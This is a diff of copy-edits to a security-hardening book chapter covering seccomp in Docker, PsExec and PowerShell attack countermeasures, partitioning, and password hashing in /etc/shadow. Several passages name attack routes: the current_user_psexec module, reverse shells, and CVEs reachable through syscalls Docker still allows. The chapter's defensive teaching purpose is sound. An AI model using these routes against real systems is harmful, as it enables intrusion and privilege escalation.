 ##### Linux Security Modules (LSM) {#vps-identify-risks-docker-docker-host-engine-and-containers-linux-security-modules}
 
-A little history to start with: In the early 1990s, Linux was developed as a clone of the Unix Operating system. The core Unix security model which is a form of [Discretionary Access Control](https://en.wikipedia.org/wiki/Discretionary_access_control) (DAC) was inherited by Linux. I have provided a glimpse of some of the Linux kernel security features that have been developed since the inception of Linux. The Unix DAC remains at the core of Linux. The Unix DAC allows a subject and/or group of an identity to set the security policy for a specific object, the canonical example being a file, and having a user set the different permissions on who can do what with it. The Unix DAC was [designed in 1969](https://www.linux.com/learn/overview-linux-kernel-security-features), and a lot has changed since then.
+A little history to start with: In the early 1990s, Linux was developed as a clone of the Unix Operating system. The core Unix security model, which is a form of [Discretionary Access Control](https://en.wikipedia.org/wiki/Discretionary_access_control) (DAC), was inherited by Linux. I have provided a glimpse of some of the Linux kernel security features that have been developed since the inception of Linux. The Unix DAC remains at the core of Linux. The Unix DAC allows a subject and/or the group of an identity to set the security policy for a specific object. The canonical example is a file, and having a user set the different permissions on who can do what with it. The Unix DAC was [designed in 1969](https://www.linux.com/learn/overview-linux-kernel-security-features), and a lot has changed since then.
  
-Capabilities may or not be to course grained, get an understanding of both capabilities and Linux Security Modules (LSMs). Many of the DACs can be circumvented by users. Finer grained control is often required along with Mandatory Access Control (MAC).
+Capabilities vary in granularity, attain an understanding of both capabilities and Linux Security Modules (LSMs). Many of the DACs can be circumvented by users. Finer grained control is often required along with Mandatory Access Control (MAC).
 
 ##### SecComp {#vps-identify-risks-docker-docker-engine-and-containers-seccomp}
 
-Secure Computing Mode (SecComp) is a security facility that reduces the attack surface of the Linux kernel by reducing the number of System calls that can be made by a process. Any System calls made by the process outside of the defined set will cause the kernel to terminate the process with `SIGKILL`. By doing this, the SecComp facility stops a process from accessing the kernel APIs via System calls.
+Secure Computing Mode (SecComp) is a security facility that reduces the attack surface of the Linux kernel by reducing the number of System calls that can be made by a process. Any System calls made by the process, outside of the defined set, will cause the kernel to terminate the process with `SIGKILL`. In so doing, the SecComp facility stops a process from accessing the kernel APIs via System calls.
 
-The first version of SecComp was merged into the Linux kernel mainline in [version 2.6.12 (March 8 2005)](https://git.kernel.org/cgit/linux/kernel/git/tglx/history.git/commit/?id=d949d0ec9c601f2b148bed3cdb5f87c052968554). If enabled for a given process, only four System calls could be made: `read()`, `write()`, `exit()`, and `sigreturn()`, thus significantly reducing the kernels attack surface.
+The first version of SecComp was merged into the Linux kernel mainline in [version 2.6.12 (March 8 2005)](https://git.kernel.org/cgit/linux/kernel/git/tglx/history.git/commit/?id=d949d0ec9c601f2b148bed3cdb5f87c052968554). If enabled for a given process, only four System calls could be made: `read()`, `write()`, `exit()`, and `sigreturn()`, thus significantly reducing the kernel's attack surface.
 
 In order to enable SecComp for a given process, [you would write](https://lwn.net/Articles/656307/) a `1` to `/proc/<PID>/seccomp`. This would cause the one-way transition into the restrictive state.
 
-There has been a few revisions, since 2005, like with the "seccomp filter mode" being added, which allowed processes to specify which System calls were allowed. Then the addition of the `seccomp()` System call in 2014 to the kernel version 3.17. [Along with popular applications](https://en.wikipedia.org/wiki/Seccomp) such as Chrome/Chromium, OpenSSH, Docker uses SecComp to reduce the attack surface on the kernel APIs.
+There have been a few revisions since 2005, such as the addition of "seccomp filter mode", which allowed processes to specify which System calls are allowed. There was also the addition of the `seccomp()` System call in 2014 to kernel version 3.17. [Like other popular applications](https://en.wikipedia.org/wiki/Seccomp) such as Chrome/Chromium and OpenSSH, Docker uses SecComp to reduce the attack surface on the kernel APIs.
 
-Docker has [disabled about 44 system calls](https://docs.docker.com/engine/security/seccomp/) in its default (seccomp) container profile ([default.json](https://github.com/docker/docker/blob/master/profiles/seccomp/default.json)) out of well over 300 available in the Linux kernel. Docker calls this "_moderately protective while providing wide application compatibility_". It appears that ease of use is the first priority. Again, plenty of opportunity here for reducing the attack surface on the kernel APIs, for example the `keyctl` System call was removed from the default Docker container profile after vulnerability [CVE-2016-0728](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-0728) was discovered, which allows privilege escalation or denial of service. [CVE-2014-3153](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-3153) is another vulnerability accessible from the `futex` System call which is white listed in the default Docker profile.
+Docker has [disabled about 44 system calls](https://docs.docker.com/engine/security/seccomp/) in its default (seccomp) container profile ([default.json](https://github.com/docker/docker/blob/master/profiles/seccomp/default.json)) out of well over 300 available in the Linux kernel. Docker calls this "_moderately protective while providing wide application compatibility_". It appears that ease of use is the first priority. Again, plenty of opportunity here for reducing the attack surface on the kernel APIs. For example, the `keyctl` System call was removed from the default Docker container profile after vulnerability [CVE-2016-0728](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2016-0728) was discovered, which allows privilege escalation or denial of service. [CVE-2014-3153](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2014-3153) is another vulnerability accessible from the `futex` System call which is white listed in the default Docker profile.
 
-If you are looking to attack the Linux kernel via its APIs from a Docker container, you have still got plenty of surface area here to play with.
+If you are looking to attack the Linux kernel via its APIs from a Docker container, you still have plenty of surface area here to play with.
 
 ##### Read-only Containers
 
-In order to set-up read-only hosts, physical or VM, there is a lot of work to be done, and in some cases, it becomes challenging to stop an Operating System writing to some files. Remember back to how much work was involved in [Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation) and [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions). In contrast, running Docker containers as read-only is trivial. Check the [Countermeasures](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers) section.
+In order to set up read-only hosts, physical or virtual, there is a lot of work to be done, and in some cases, it becomes challenging to stop an Operating System writing to some files. Recall how much work was involved in [Partitioning on OS Installation](#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation) and [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions). In contrast, running Docker containers as read-only is trivial. Check the [Countermeasures](#vps-countermeasures-docker-hardening-docker-host-engine-and-containers-read-only-containers) section.
 
 #### Application Security
 ![](images/ThreatTags/easy-common-easy-moderate.png)
 
-Application security is still our biggest weakness. I cover this in many other places, and especially in the [Web Applications](#web-applications) chapter.
+Application security is still our biggest weakness. I cover this in many other places, especially in the [Web Applications](#web-applications) chapter.
 
 ### Using Components with Known Vulnerabilities
 ![](images/ThreatTags/average-widespread-difficult-moderate.png)
 
-This is exactly what your attackers rely on you doing. Not upgrading out of date software. This is the same concept as discussed in the Web Applications chapter under "[Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source)". Just do not do it. Stay patched.
+This is exactly what your attackers rely on you doing: not upgrading out of date software. This is the same concept as discussed in the Web Applications chapter under "[Consuming Free and Open Source](#web-applications-identify-risks-consuming-free-and-open-source)". Just do not do it: stay patched!
 
 ### Lack of Backup
 ![](images/ThreatTags/difficult-common-veryeasy-moderate.png)
 
-There is not a lot to say here, other than make sure you do this. I have personally seen so many disasters that could have been avoided if timely / regular backups had of been implemented and tested routinely. I have seen many situations where backup schedules were in place, but they had not been tested for a period of time, and when it came time to use them, they were not available for various reasons. When your infrastructure gets owned, don't be the one that can not roll back to a good known state.
+There is not a lot to say here, other than make sure you do this. I have personally seen so many disasters that could have been avoided if timely / regular backups had been implemented and tested routinely. I have seen many situations where backup schedules were in place, but they had not been tested for a period of time, and when it came time to use them, they were not available for various reasons. When your infrastructure gets owned, don't be the one that can not roll back to a good known state.
 
 ### Lack of Firewall {#vps-identify-risks-lack-of-firewall}
 ![](images/ThreatTags/average-uncommon-veryeasy-moderate.png)
 
-Now this is addressed, because so many rely on firewalls to hide many weak areas of defence. The lack of a firewall if your services and communications between them are hardened does not have to be an issue, in-fact I see it as a goal many of us should have, as it forces us to build better layers of defence.
+So many rely on firewalls to hide many weak areas of defence. The lack of a firewall does not have to be an issue if your services and communications between them are hardened. In fact, I see it as a goal many of us should have, as it forces us to build better layers of defence.
 
 ## 3. SSM Countermeasures {#vps-countermeasures}
 * [MS Host Threats and Countermeasures](https://msdn.microsoft.com/en-us/library/ff648641.aspx#c02618429_007)
@@ -1488,7 +1485,7 @@ Now this is addressed, because so many rely on firewalls to hide many weak areas
 ### Forfeit Control thus Security {#vps-countermeasures-forfeit-control-thus-security}
 ![](images/ThreatTags/PreventionEASY.png)
 
-Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. How easy this will be is determined by how much you already have invested. Cloud offerings are often more expensive in monetary terms for medium to large environments, so as you grow, the cost benefits you may have gained due to quick development up-front will often become an anchor holding you back. Because you may have bought into their proprietary way of doing things, it now becomes costly to migrate, and your younger competitors which can turn quicker, out manoeuvre you. Platform as a Service and serverless technologies often appear even more attractive, but everything comes at a cost, cloud platforms may look good to start with, but often they are to good, and the costs will catch up with you. All that glitters is not gold.
+Bringing your VPS(s) in-house provides all the flexibility/power required to mitigate just about all the risks due to outsourcing to a cloud or hosting provider. How easy this will be is determined by how much you already have invested. Cloud offerings are often more expensive in monetary terms for medium to large environments, so as you grow, the cost benefits you may have gained due to quick development up-front will often become an anchor holding you back. Because you may have bought into a cloud or hosting provider's proprietary way of doing things, it now becomes costly to migrate, and your younger competitors, who can turn more quickly, out manoeuvre you. Platform as a Service (PaaS) and serverless technologies often appear even more attractive, but everything comes at a cost. Cloud platforms may look good to start with, but often they are too good, and the costs will catch up with you. All that glitters is not gold.
 
 ### Windows
 
@@ -1497,39 +1494,39 @@ Bringing your VPS(s) in-house provides all the flexibility/power required to mit
 
 Defence in depth will help here, the attacker should not be in possession of your admin passwords or hashes. If this has already happened, how did it happen? Take the necessary steps to make sure it does not happen again.
 
-Samba is not usually installed on Linux by default, but as we are dealing with Windows here, you do not have the option of whether SMB is installed and running on your machines.
+Samba is not usually installed on Linux by default, but as we are dealing with Windows here, SMB is installed and running on your machines.
 
 * Port scan your target machines
 * Close the SMB related ports 445 TCP, earlier OS's used 137, 138, 139
 * Port scan again to verify
 * Turn off public folder sharing
 
-Check the list of requirements for PsExec and turn of / disable what you can.
+Check the list of requirements for PsExec and turn off / disable what you can.
 
 Try and re-exploit with the provided directions in the [Identify Risks](#vps-identify-risks-psexec) section.
 
-Restrict administrative accounts as much as possible, especially network administrator accounts. All users should have the least amount of privilege necessary in order to do their jobs and elevate only when needed. This is why most Linux distributions use sudo.
+Restrict administrative accounts as much as possible, especially network administrator accounts. All users should have the least amount of privilege necessary in order to do their jobs, and elevate only when needed. This is why most Linux distributions use sudo.
 
 Consider multi-factor authentication methods for administrators.
 
-How exposed are administrators machines? Can they be put on a less exposed network segment? 
+How exposed are administrator's machines? Can they be put on a less exposed network segment? 
 
-In a Windows network, those that are the most likely to be exploited are administrators. Pay special attention to them and their machines. For example, if an attacker uses the `current_user_psexec` module, then once they have access to an administrators machine, traversal to other machines like Domain Controllers is trivial if the administrators current login context allows them to access the Domain Controller. Make sure the administrators are aware of this and that they only elevate privileges when it is required and not on their own machines.
+In a Windows network, those who are the most likely to be exploited are administrators. Pay special attention to them and their machines. For example, if an attacker uses the `current_user_psexec` module, then once they have access to an administrator's machine, traversal to other machines like Domain Controllers is trivial if the administrator's current login context allows them to access the Domain Controller. Make sure  administrators are aware of this, and that they only elevate privileges when it is required, and not on their own machines.
 
-Network Intrusion Detection Systems ([NIDS](#network-countermeasures-lack-of-visibility-nids)) will more than likely not be able to detect the actual passing of the administrators credentials to the target system, because that is how the legitimate SysInternals PsExec behaves, but what a NIDS can be configured to watch for is what happens when the attackers payload executes, for example, it is not normally legitimate behaviour for reverse shells to be sent over the network. Host Intrusion Detection Systems ([HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids)) can of course detect the presence of additional and modified files, although these are less commonly run on desktop computers.
+Network Intrusion Detection Systems ([NIDS](#network-countermeasures-lack-of-visibility-nids)) not be likely able to detect the actual passing of the administrator's credentials to the target system due tolegitimate SysInternals PsExec behavior, but a NIDS can be configured to watch for what happens when the attackers payload executes. For example, it is not normally legitimate behaviour for reverse shells to be sent over the network. Host Intrusion Detection Systems ([HIDS](#vps-countermeasures-lack-of-visibility-host-intrusion-detection-systems-hids)) can, of course, detect the presence of additional and modified files, although these are less commonly run on desktop computers.
 
 #### PowerShell Exploitation with Persistence {#vps-countermeasures-powershell-exploitation-with-persistence}
 ![](images/ThreatTags/PreventionDIFFICULT.png)
 
 Upgrade PowerShell to the latest version.
 
-As above, **NIDS can help** here, Often these attacks do not leave any files on the disk. Next Generation AV products are slowly coming to the market, such as those that use machine learning. Most of the products I have seen so far are very expensive though, this should change in time.
+As above, **NIDS can help** here. Often these attacks do not leave any files on the disk. Next-generation AV products are slowly coming to the market, such as those that use machine learning. Most of the products I have seen so far are very expensive though, this should change in time.
 
-**Deep Script Block Logging** can be enabled from PowerShell v5 onwards. This option tells PowerShell to record the content of all script blocks that it processes, we rely heavily on script blocks with PowerShell attacks. Script Block Logging includes recording of dynamic code generation and provides insight into all the script-based activity on the system, including scripts that are encoded to evade anti-virus, and understanding of observation from human eyes. Applies to any application that hosts PowerShell engine, CLI, ISE.
+**Deep Script Block Logging** can be enabled from PowerShell v5 onwards. This option tells PowerShell to record the content of all script blocks that it processes, we rely heavily on script blocks with PowerShell attacks. Script Block Logging includes recording of dynamic code generation and provides insight into all the script-based activity on the system, including scripts that are encoded to evade antimalware, and understanding of observation with human eyes. This applies to any application that hosts PowerShell engine, CLI, or ISE.
 
 [Script Block Logging records](https://www.fireeye.com/blog/threat-research/2016/02/greater_visibilityt.html) and logs the original obfuscated (XOR, Base64, encryption, etc) script, transcripts, and de-obfuscated code.
 
-Run gpedit.msc -> opens Local Group Policy Editor -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn On PowerShell Script Block Logging -> Check the "Enabled box". By default, each script block is only logged the first time it is run. You can also check the "Log script block invocation start / stop events" check box if you want to log start and stop events for every time any script block is invoked. The second option can produce very large amounts of log events though.
+Run gpedit.msc -> open Local Group Policy Editor -> Administrative Templates -> Windows Components -> Windows PowerShell -> Turn On PowerShell Script Block Logging -> Check the "Enabled box". By default, each script block is only logged the first time it is run. You can also check the "Log script block invocation start / stop events" check box if you want to log start and stop events for every time any script block is invoked. The second option can produce very large amounts of log events though.
 
 This setting may also be accessible from the registry:
 
@@ -1542,22 +1539,22 @@ or
 ### Minimise Attack Surface by Installing Only what you Need
 ![](images/ThreatTags/PreventionVERYEASY.png)
 
-I am hoping this goes without saying, unless you are setting up a Windows server with "all the stuff" that you have little control over its hardening process, which is why I favour UNIX based servers. I/You have all the control, if anything goes wrong, it will usually be our own fault for missing or neglecting something. The less you have on your servers, the fewer servers you have, the smaller the network you have, the less employees you have, basically the smaller and lesser of everything you have, the less there is to compromise by an attacker and the quicker you can move.
+I am hoping this goes without saying, unless you are setting up a Windows server with "all the stuff", and you have little control over its hardening process. This is why I favour UNIX-based servers. I/You have all the control, if anything goes wrong, it will usually be our own fault for missing or neglecting something. The less exposure you have on your servers, the fewer servers you have, the smaller the network you have, the fewer employees you have (the less you have of everything), the less there is for an attacker to compromise, and the quicker you can move.
 
 ### Disable, Remove Services. Harden what is left {#vps-countermeasures-disable-remove-services-harden-what-is-left}
 
-Much of this section came from a web server I set-up, from install and through the hardening process.
+Much of this section came from a web server I set-up, from install through the hardening process.
 
-There are often a few services you can disable even on a bare bones Debian install and some that are just easier to remove. Then go through the process of hardening what is left. Make sure you test before and after each service you disable, remove or harden, watch the port being opened/closed, etc. Remember, the less you have, the less there is to be exploited.
+There are often a few services you can disable, even on a bare bones Debian install, and some that are just easier to remove. Then go through the process of hardening what is left. Make sure you test before and after each service you disable, remove or harden, watch the port being opened/closed, etc. Remember, the less you have, the less there is to be exploited.
 
 #### Partitioning on OS Installation {#vps-countermeasures-disable-remove-services-harden-what-is-left-partitioning-on-os-installation}
 ![](images/ThreatTags/PreventionAVERAGE.png)
 
-By creating many partitions and applying the least privileges necessary to each in order to be useful, you are making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to.
+By creating many partitions, and applying the least privileges necessary to each in order to be useful, you are making it difficult for an attacker to carry out many malicious activities that they would otherwise be able to.
 
-This is a similar concept to tightly constraining input fields to only be able to accept structured data (names (alpha only), dates, social security numbers, zip codes, email addresses, etc) rather than just leaving the input wide open to be able to enter any text as discussed in the Web Applications chapter under [What is Validation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation).
+This is a similar concept to tightly constraining input fields to only be able to accept structured data (names (alpha only), dates, social security numbers, zip codes, email addresses, etc) rather than leaving input wide open to the entry of any text, as discussed in the Web Applications chapter under [What is Validation](#web-applications-identify-risks-lack-of-input-validation-filtering-and-sanitisation-generic-what-is-validation).
 
-The way I'd usually set-up a web servers partitions is as follows. Delete all the current partitions and add the following. `/` was added to the start and the rest to the end, in the following order: `/`, `/var/log` (optional, but recommended), `/var/tmp` (optional, but recommended), `/var`, `/tmp`, `/opt`, `/usr/share` (optional, but recommended), `/usr`, `/home`, `swap`.
+The way I'd usually set-up a web server's partitions is as follows. Delete all the current partitions and add the following. `/` was added to the start and the rest to the end, in the following order: `/`, `/var/log` (optional, but recommended), `/var/tmp` (optional, but recommended), `/var`, `/tmp`, `/opt`, `/usr/share` (optional, but recommended), `/usr`, `/home`, `swap`.
 
 You will notice in the [Lock Down the Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section, that I ended up adding additional partitions (mentioned in the previous paragraph) to apply finer grained control on directories often targeted by attackers. It is easier to add those partitions here, we will add options to them in the Lock Down section.
 
@@ -1578,7 +1575,7 @@ If you add the "optional, but recommended" partitions, then they may look more l
     /dev/sda11       95M  1.6M   87M   2% /var/tmp
     /dev/sda12      186M   39M  134M  23% /var/log
 
-The sizes should be set-up according to your needs. If you have plenty of RAM, make your `swap` small, if you have minimal RAM (barely (if) sufficient), you could double the RAM size for your `swap`. It is usually a good idea to think about what mount options you want to use for your specific directories. This may shape how you set-up your partitions. For example, you may want to have options `nosuid`,`noexec` on `/var` but you can’t because there are shell scripts in `/var/lib/dpkg/info` so you could set-up four partitions. `/var` without `nosuid`,`noexec` and `/var/tmp`, `/var/log`, `/var/account` with `nosuid`,`noexec`. Look ahead to the [Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section for more details, or just wait until you get to it.
+Partition sizes should be set-up according to your needs. If you have plenty of RAM, make your `swap` small, if you have minimal RAM (barely (if) sufficient), you could double the RAM size for your `swap`. It is usually a good idea to think about what mount options you want to use for your specific directories. This may shape how you set up your partitions. For example, you may want to have options `nosuid`,`noexec` on `/var` but you cannot because there are shell scripts in `/var/lib/dpkg/info`, so you could set-up four partitions: `/var` without `nosuid`,`noexec` and `/var/tmp`, `/var/log`, `/var/account` with `nosuid`,`noexec`. Look ahead to the [Mounting of Partitions](#vps-countermeasures-disable-remove-services-harden-what-is-left-lock-down-the-mounting-of-partitions) section for more details, or just wait until you get to it.
 
 You can think about changing `/opt` (static data) to mount read-only in the future as another security measure if you like.
 
@@ -1586,11 +1583,11 @@ You can think about changing `/opt` (static data) to mount read-only in the futu
 
 If you want to:
 
-1. save on bandwidth
+1. Save on bandwidth
 2. Have a large number of your packages delivered at your network speed rather than your internet speed
-3. Have several Debian based machines on your network
+3. Have several Debian-based machines on your network
 
-I recommend using apt-cacher-ng, installable with an `apt-get`, you will have to set this up on a server, by modifying the `/var/apt-cacher-ng/acng.conf` file to suite your environment. There is ample documentation. Then add the following file to each of your debian based machines.
+I recommend using apt-cacher-ng, installable with an `apt-get`, you will have to set this up on a server, by modifying the `/var/apt-cacher-ng/acng.conf` file to suite your environment. There is ample documentation. Then, add the following file to each of your debian based machines.
 
 `/etc/apt/apt.conf` with the following contents and set its permissions to be the same as your sources.list:
 
@@ -1599,28 +1596,28 @@ I recommend using apt-cacher-ng, installable with an `apt-get`, you will have to
     # Port is the port that your apt-cacher is listening on, usually 3142
     Acquire::http::Proxy “http://[IP]:[Port]”;
 
-Now just replace the apt proxy references in the `/etc/apt/sources.list` of your consuming servers with the internet mirror you want to use, so we contain all the proxy related config in one line in one file. This will allow the requests to be proxied and packages cached via the apt cache on your network when requests are made to the mirror of your choosing.
+Now, just replace the apt proxy references in the `/etc/apt/sources.list` of your consuming servers with the internet mirror you want to use, thus we contain all the proxy related config in one line in one file. This will allow the requests to be proxied and packages cached via the apt cache on your network when requests are made to the mirror of your choosing.
 
-Update the list of packages then upgrade them with the following command line. If you are using sudo, you will need to add that to each command:
+Update the list of packages, then upgrade them with the following command line. If you are using sudo, you will need to add that to each command:
 
 {linenos=off, lang=Bash}
     apt-get update && apt-get upgrade
     # Only run apt-get upgrade if apt-get update is successful (exits with a status of 0).
 
-Now if you're working through an installation, you'll be asked for a mirror to pull packages from. If you have the above apt caching server set-up on your network, this is a good time to make it work for you. You'll just need to enter the caching servers IP address and port.
+Now, if you're working through an installation, you'll be asked for a mirror to pull packages from. If you have the above apt caching server set-up on your network, this is a good time to make it work for you. You'll just need to enter the caching servers IP address and port.
 
-A> The steps you take to harden your server(s) that will have many user accounts will be considerably different to this. Many of the steps I have gone through here will be insufficient for a server with many users. The hardening process is not a one time procedure. It ends when you decommission the server. Be prepared to stay on top of your defences. It is much harder to defend against attacks than it is to exploit a vulnerability.
+A> The steps you take to harden your server(s) that will have many user accounts will be considerably different to this. Many of the steps I have gone through here will be insufficient for a server with many users. The hardening process is not a one-time procedure. It ends when you decommission the server. Be prepared to stay on top of your defences. It is much harder to defend against attacks than it is to exploit a vulnerability.
 
 #### Review Password Strategies {#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies}
 ![](images/ThreatTags/PreventionEASY.png)
 
-A lot of the following you will have to follow along with on your VPS in order to understand what I am saying.
+You will likely have to follow along on your VPS through this next section in order to understand what I am saying.
 
 Make sure passwords are encrypted with an algorithm that will stand up to the types of attacks and hardware you anticipate that your attackers will use. I have provided additional details around which Key Derivation Functions are best suited to which types of hardware in the "[Which KDF to use](#web-applications-countermeasures-data-store-compromise-which-kdf-to-use)" section within the Web Applications chapter.
 
 In most cases you will [want to](http://www.tldp.org/HOWTO/Shadow-Password-HOWTO-2.html#ss2.2) shadow your passwords. This should be the default in most, or all recent Linux distributions.
 
-How do you know if you already have the Shadow Suite installed? If you have a `/etc/shadow` file, take a look at the file and you should see your user and any others with an encrypted value following it. There will be a reference to the password from the `/etc/passwd` file, stored as a single `X` (discussed below). If the Shadow Suite is not installed, then your passwords are probably stored in the `/etc/passwd` file.
+How do you know if you already have the Shadow Suite installed? If you have a `/etc/shadow` file, take a look at the file. You should see your user and any others with an encrypted value following it. There will be a reference to the password from the `/etc/passwd` file, stored as a single `X` (discussed below). If the Shadow Suite is not installed, then your passwords are probably stored in the `/etc/passwd` file.
 
 [Crypt](https://en.wikipedia.org/wiki/Crypt_(C)), crypt 3 or crypt(3) is the Unix C library function designed for password authentication. The following table shows which Operating Systems have support out of the box and with which hashing functions or key derivation functions are supported. We discuss this table in a moment, so don't worry just yet if you do not understand it all:
 
@@ -1638,20 +1635,20 @@ It may be worth looking at and modifying the `/etc/shadow` file. Consider changi
 * pam_unix
 
 {#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-default-number-of-rounds}
-Out of the box crypt (glibc) supports MD5, SHA-256 and SHA-512, I wouldn't bother looking at DES, and MD5 is common but weak. You can also use the blowfish cipher via the bcrypt KDF with a little more work (a few minutes). The default of SHA-512 (in debian) enables salted passwords. The SHA family of hashing functions are to fast for password hashing. Crypt applies key stretching to slow brute-force cracking attempts down. The default number of rounds [have not changed](https://access.redhat.com/articles/1519843) in at least 9 years, so it is well worth modifying the number to keep up with hardware advancements. There are some [details](#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot) to work out what the factor should be, provided by OWASP in the MembershipReboot section in the Web Applications chapter. The [default number of rounds](https://en.wikipedia.org/wiki/Passwd) are as follows:
+Out of the box, crypt (glibc) supports MD5, SHA-256 and SHA-512, I wouldn't bother looking at DES, and MD5 is common but weak. You can also use the blowfish cipher via the bcrypt KDF with a little more work (a few minutes). The default of SHA-512 (in debian) enables salted passwords. The SHA family of hashing functions are too fast for password hashing. Crypt applies key stretching to slow brute-force cracking attempts down. The default number of rounds [have not changed](https://access.redhat.com/articles/1519843) in at least 9 years, so it is well worth modifying the number to keep up with hardware advancements. There are some [details](#web-applications-countermeasures-lack-of-authentication-authorisation-session-management-technology-and-design-decisions-membershipreboot) to work out what the factor should be, as provided by OWASP in the MembershipReboot section in the Web Applications chapter. The [default number of rounds](https://en.wikipedia.org/wiki/Passwd) are as follows:
 
 * MD5: 1000 rounds
 * Blowfish: 64 rounds
 * SHA-[256, 512]: 5000 rounds
 
 {#vps-countermeasures-disable-remove-services-harden-what-is-left-review-password-strategies-owasp-advice}
-The OWASP advice says we should double the rounds every subsequent two years. So for the likes of SHA in 2007 having 5000 rounds, we should be looking at increasing this to `160000` in the year 2017, so if you are still with the default, you are a long way behind and it is time to do some serious key stretching.
+The OWASP advice says we should double the rounds every subsequent two years. So, for the likes of SHA in 2007 having 5000 rounds, we should be looking at increasing this to `160000` in the year 2017, if you are still using the default, you are a long way behind, and it is time to do some serious key stretching.
 
 ![](images/KeyStretching.png)
 
 How can you tell which algorithm you are using, salt size, number of iterations for the computed password, etc? The [crypt 3](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) man page explains it all. By default a Debian install will be using SHA-512 which is better than MD5 and the smaller SHA-256. Don't take my word for it though, just have a look at the `/etc/shadow` file. I explain the file format below.
 
-Now by default I did not have a “rounds” option in my `/etc/pam.d/common-password` module-arguments. Having a large iteration count (number of times the encryption algorithm is run (key stretching)) and an attacker not knowing what that number is, will slow down a brute-force attack.
+By default, I did not have a “rounds” option in my `/etc/pam.d/common-password` module-arguments. Having a large iteration count (number of times the encryption algorithm is run (key stretching)) and an attacker not knowing what that number is, will slow down a brute-force attack.
 
 You can increase the `rounds` by overriding the default in `/etc/pam.d/common-passwowrd`. You override the default by adding the rounds field and the value you want to use, as seen below.
 
@@ -1660,13 +1657,13 @@ You can increase the `rounds` by overriding the default in `/etc/pam.d/common-pa
 
 Next time someone changes their password (providing the account is local), `[number of rounds]` number of `rounds` will be used.
 
-I would suggest adding this and re creating your passwords now. Just before you do, it is usually a good idea to be logged in at an extra terminal and possibly a root terminal as well, until you are sure you can log in again. It just makes things easier if for what ever reason you can no longer log in at a new terminal. Now... as your normal user run:
+I would suggest adding this and recreating your passwords now. Just before you do, it is usually a good idea to be logged in at an extra terminal and possibly a root terminal as well, until you are sure you can log in again. It just makes things easier if, for what ever reason, you can no longer log in at a new terminal. Now, as your normal user run:
 
 `passwd`
 
-providing your existing password then your new one twice. You should now be able to see your password in the `/etc/shadow` file with the added `rounds` parameter.
+providing your existing password, then your new one twice. You should now be able to see your password in the `/etc/shadow` file with the added `rounds` parameter.
 
-Also have a check in `/var/log/auth.log`. Reboot and check you can still log in as your normal user. If all good. Do the same with the root account.
+Also, have a check in `/var/log/auth.log`. Reboot and check that you can still log in as your normal user. If all good, do the same with the root account.
 
 Let's have a look at the `passwd` and `shadow` file formats.
 
@@ -1676,7 +1673,7 @@ Let's have a look at the `passwd` and `shadow` file formats.
     you:$id$rounds=<number of rounds, specified in /etc/pam.d/common-password>$[up to 16 character salt]$[computed password]:<rest of string>
 
 1. `you` is the Account username
-2. `$id$salt$hashedpassword` is generally considered to be called the encrypted password, although this is made up of three base fields separated by the `$`. The `id` can be any of the *Scheme id*s that crypt supports, as shown in the above table. How the rest of the substrings in this field are interpreted is [determined](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) by what is found in the `id` field. The salt can be up to 16 characters. In saying that, the salt can be [augmented](http://backreference.org/2014/04/19/many-ways-to-encrypt-passwords/) by prepending the `rounds=<number of rounds, sourced from /etc/pam.d/common-password>$` directive.
+2. `$id$salt$hashedpassword` is generally considered to be the encrypted password, although this is made up of three base fields separated by the `$`. The `id` can be any of the *Scheme id*s that crypt supports, as shown in the above table. How the rest of the substrings in this field are interpreted is [determined](http://man7.org/linux/man-pages/man3/crypt.3.html#NOTES) by what is found in the `id` field. The salt can be up to 16 characters. In saying that, the salt can be [augmented](http://backreference.org/2014/04/19/many-ways-to-encrypt-passwords/) by prepending the `rounds=<number of rounds, sourced from /etc/pam.d/common-password>$` directive.
 
 The hashed part of the password string is the actual computed password. The size of this string is fixed as per the below table:
 
@@ -1687,12 +1684,12 @@ The rest of the fields are as per below.
 {title="/etc/shadow", linenos=off, lang=Bash}    
     daemon:*:15980:0:99999:7:::
 
-1. `daemon` is the account username
+1. `daemon` is the account username.
 2. `*` is the place where the salt and hashed password would go, the asterisk means that this account can not be used to log in.
 3. `15980` is the number of days from the Unix "epoch" (1970-1-1) to when the password was changed.
 4. `0` is the minimum password age or number of days that the user will have to wait before they will be allowed to change their password. An empty field or `0` means that there is no minimum.
 5. `99999` is the maximum number of days until the user will be forced to change their password. `99999` or an empty value means that there is no limit to the maximum age that the password should be changed. If the maximum password age is lower than the minimum password age (No. 4) the user can not change their password.
-6. `7` is the password warning period. An empty value or `0` means that there is no warning period.
+6. `7` is the password warning period. An empty value of `0` means that there is no warning period.
 7. The last three fields are:
     1. Password inactivity period, days before the account is made inactive
     2. Account expiration date, expressed in days since Unix "epoch" (1970-1-1)
@@ -1704,17 +1701,17 @@ The format of the `/etc/passwd` file is as follows:
     root:x:0:0:root:/root:/bin/bash
     you:x:1000:1000:you,,,:/home/you:/bin/bash
 
-1. `root` and `you` are the account usernames
+1. `root` and `you` are the account usernames.
